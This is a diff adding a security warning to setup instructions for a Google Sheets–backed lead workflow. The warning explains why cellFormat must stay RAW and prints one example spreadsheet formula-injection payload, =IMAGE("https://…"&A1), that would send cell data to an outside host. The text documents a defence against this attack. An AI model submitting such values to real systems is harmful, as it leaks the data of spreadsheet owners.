@@ -152,6 +152,20 @@ sanitization working:
 | `REPLACE_WITH_DATA_TABLE_ID` | all 4 Data Table nodes | Pick `leadflow_event_ledger` from the dropdown. |
 | *(no credential bound)* | all 8 Google Sheets nodes | Select `GHL LeadFlow Demo — Google Sheets`. |
 
+> **Do not drop `options.cellFormat: "RAW"` from any Sheets node.** The node
+> defaults `cellFormat` to `USER_ENTERED`, which interprets a value exactly as
+> if a person had typed it — so text beginning `=`, `+`, `-`, or `@` is stored
+> as a **live formula**, not as text.
+>
+> That is reachable by an attacker who holds no secret at all. The lead form is
+> public; a submitted name of `=IMAGE("https://…"&A1)` travels to GHL, GHL
+> attaches the *correct* shared secret and delivers it, ingress authorises it
+> legitimately, and the formula lands in the durable backup. `RAW` stores every
+> value literally and closes it.
+
+The export ships `RAW` on all eight nodes. Verify after import — a re-picked
+node can silently reset its options.
+
 Then **Save and Activate**, and copy the **Production** webhook URL. The Test
 URL expires after 120 seconds and will die mid-demo.
 
